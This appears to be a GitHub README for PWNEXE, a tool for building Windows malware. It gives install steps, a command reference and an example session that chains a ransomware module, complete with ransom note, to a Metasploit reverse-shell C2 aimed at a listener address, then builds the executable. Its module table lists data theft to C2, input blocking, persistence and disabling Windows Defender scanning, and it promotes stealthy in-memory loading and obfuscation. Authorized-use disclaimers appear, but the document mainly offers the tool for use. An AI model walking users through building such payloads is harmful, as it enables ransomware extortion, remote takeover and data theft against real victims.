## Overview
**PWNEXE** is a modular Windows malware generation framework. It empowers security researchers and red teamers to rapidly build custom malware payloads by chaining together a variety of modules—such as ransomware, persistence loaders, C2 servers, and more—into a single executable. PWNEXE is designed for advanced adversary simulation, malware research, and authorized red team operations.

> **Warning:** This tool is for educational and authorized security research only. Misuse may be illegal and unethical.

---

## Features

- **Modular Payloads:** Chain multiple modules (ransomware, persistence, C2, etc.) into a single EXE.
- **Customizable Options:** Configure module and build options (e.g., ransom note, C2 port, EXE name).
- **In-Memory Execution:** Optional Rust loader for stealthy, in-memory payload delivery.
- **Obfuscation Support:** Optional payload obfuscation via LLVM and Rust.
- **Cross-Platform Build:** Uses Go and Rust for robust Windows payloads.
- **Fast Build Pipeline:** Output is saved to the `.LOOT` directory.

---

## Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/sarwaaaar/PWNEXE.git
   cd PWNEXE
   ```
2. **Install Python 3.8+**
   ```bash
   python3 --version
   # If needed, install Python 3.8 or newer
   ```
3. **Install dependencies:**
   ```bash
   python3 -m pip install --upgrade pip
   python3 -m pip install -r requirements.txt
   ```
4. **Install system dependencies:**
   - Go (for module compilation)
   - Rust (for in-memory loader)
   - Optional: Docker (for obfuscation)
   - On macOS:
     ```bash
     brew install go rust
     # Docker: https://docs.docker.com/get-docker/
     ```
   - On Linux:
     ```bash
     sudo apt install golang rustc cargo
     # Docker: https://docs.docker.com/get-docker/
     ```

---

## Usage

Start the tool:
```bash
python3 main.py
```

### Command Reference

- `use <module>` — Add a module to the build chain
- `set <OPTION> <VALUE>` — Set build/module options
- `show modules` — List available modules
- `show options` — Show current build/module options
- `build` — Build the final EXE payload
- `clear` — Clear selected modules
- `delete` — Remove a module from the chain
- `exit` — Exit the tool

### Example Workflow
```
pwnexe > show modules
pwnexe > use daemon/bartmoss
pwnexe > set NOTE "Your files have been encrypted! Contact evil@domain.com."
pwnexe > use daemon/spider
pwnexe > set LHOST 192.168.1.10
pwnexe > set LPORT 4444
pwnexe > build
```
- The final EXE will be saved in the `.LOOT` directory.

---

## Available Modules

| Module                   | Description                                                        |
|--------------------------|--------------------------------------------------------------------|
| daemon/filedaemon        | Normal C2 server to receive data                                   |
| daemon/spider            | Metasploit C2 server (reverse shell/payload delivery)              |
| daemon/bartmoss          | Ransomware builder                                                 |
| interfaceplug/blackout   | Screen blackout utility                                            |
| interfaceplug/suicide    | Block input (DoS)                                                  |
| quickhack/ping           | Sends back user info to the C2 server                              |
| quickhack/icepick        | Adds EXE to persistence and adds exclusion to Windows Defender      |

---

## Advanced Features
- **Module Chaining:** Combine multiple behaviors in one payload.
- **Custom Build Options:** Set EXE name, enable obfuscation, etc.
- **In-Memory Execution:** Use Rust loader for stealthy delivery.

---

## Legal Disclaimer

PWNEXE is intended for educational purposes and authorized security testing only. You must have explicit permission to use this tool against any system or network. The authors and contributors are not responsible for misuse, damage, or legal consequences. Always follow applicable laws and ethical guidelines.

---

## Contributing

Contributions are welcome! Please fork the repository, create a feature branch, and submit a pull request with a detailed description of your changes.

---

## License

MIT License. See the `LICENSE` file for details.
